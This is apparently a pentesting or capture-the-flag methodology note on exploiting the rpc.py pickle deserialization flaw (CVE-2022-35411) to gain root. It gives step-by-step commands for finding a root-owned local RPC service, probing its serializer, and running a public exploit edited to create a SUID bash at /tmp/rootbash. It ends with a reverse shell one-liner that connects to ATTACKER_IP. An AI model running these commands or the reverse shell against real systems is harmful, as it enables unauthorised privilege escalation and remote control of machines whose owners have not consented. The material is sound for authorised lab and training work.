# rpc.py

`rpc.py` is a Python RPC framework. Versions up to 0.6.0 are vulnerable to unauthenticated RCE when the server accepts the insecure `pickle` serializer.

## Discovery

Look for local Python ASGI/RPC services, especially when a process is running as root:

```bash
ss -antpu
# 127.0.0.1:65432 LISTEN

ps -elf --forest
# root ... python3 /opt/rpc.py
```

Source code may show the framework:

```python
from rpcpy import RPC

app = RPC(mode="ASGI")
```

Supervisor configs can confirm the service user and command:

```bash
cat /etc/supervisor/conf.d/rpc.conf
```

```ini
[program:rpc]
user=root
command=python3 /opt/rpc.py
```

## Basic Probing

The app may reject GET and empty POST requests:

```bash
curl -v http://127.0.0.1:65432/
# 405 Method Not Allowed

curl -v -X POST http://127.0.0.1:65432/
# You must set a value for header `serializer` or `content-type`
```

That error is a useful hint to test serializers.

## CVE-2022-35411 - Pickle Deserialization

If the service accepts `serializer: pickle`, a malicious pickle payload can execute commands as the service user.

PoC:

```bash
git clone https://github.com/ehtec/rpcpy-exploit
```

Edit the command in the exploit to create a SUID bash:

```python
exec_command('cp /bin/bash /tmp/rootbash')
exec_command('chmod +s /tmp/rootbash')
```

Run it from the target if the service only listens on localhost:

```bash
python3 rpcpy-exploit.py
ls -la /tmp/rootbash
/tmp/rootbash -p
id
```

If command chaining fails or a typo prevents SUID from being set, rerun a single simple command such as `chmod +s /tmp/rootbash` and verify permissions.

## Reverse Shell Alternative

If SUID bash does not work, execute a reverse shell:

```bash
sh -i >& /dev/tcp/ATTACKER_IP/9001 0>&1
```

When using a script stager, run it in the foreground first. Backgrounding it can make troubleshooting harder.
